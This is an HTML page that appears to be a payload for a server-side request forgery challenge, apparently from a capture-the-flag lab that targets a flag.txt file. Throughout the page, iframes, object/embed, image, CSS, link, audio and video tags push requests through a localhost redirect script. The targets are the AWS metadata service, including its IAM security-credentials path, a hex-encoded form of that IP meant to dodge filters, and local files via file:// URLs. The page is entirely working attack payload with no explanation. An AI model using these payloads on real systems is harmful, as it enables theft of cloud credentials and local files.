<!DOCTYPE html>
<html>
<head>
    <title>Alternative SSRF Methods</title>
</head>
<body>
    <h1>Alternative SSRF Techniques</h1>
    
    <!-- Method 1: URL Encoded Payloads -->
    <h3>URL Encoded AWS Metadata</h3>
    <iframe src="http://localhost/redir.php?url=http%3A//169.254.169.254/latest/meta-data/" width="100%" height="300"></iframe>
    
    <!-- Method 2: Different IP Representations -->
    <h3>Alternative IP Formats</h3>
    <iframe src="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="300"></iframe>
    <iframe src="http://localhost/redir.php?url=http://0xa9fea9fe/latest/meta-data/" width="100%" height="200"></iframe>
    
    <!-- Method 3: Object and Embed Elements -->
    <h3>Object/Embed Based Requests</h3>
    <object data="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200">
        <embed src="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200">
    </object>
    
    <!-- Method 4: Image with Error Handling -->
    <h3>Image-Based Attempts</h3>
    <img src="http://localhost/redir.php?url=file:///flag.txt" width="100%" height="200" 
         alt="Flag content should appear here if successful">
    
    <!-- Method 5: CSS Background Images -->
    <h3>CSS-Based Requests</h3>
    <div style="background-image: url('http://localhost/redir.php?url=file:///flag.txt'); 
                width: 100%; height: 200px; background-size: contain; background-repeat: no-repeat;">
    </div>
    
    <!-- Method 6: Link with different types -->
    <h3>Link-Based Requests</h3>
    <link rel="stylesheet" href="http://localhost/redir.php?url=file:///flag.txt">
    <link rel="prefetch" href="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/">
    
    <!-- Method 7: Audio/Video Elements -->
    <h3>Media Element Requests</h3>
    <audio controls>
        <source src="http://localhost/redir.php?url=file:///flag.txt" type="audio/mpeg">
    </audio>
    <video controls width="100%" height="200">
        <source src="http://localhost/redir.php?url=file:///flag.txt" type="video/mp4">
    </video>
</body>
</html>
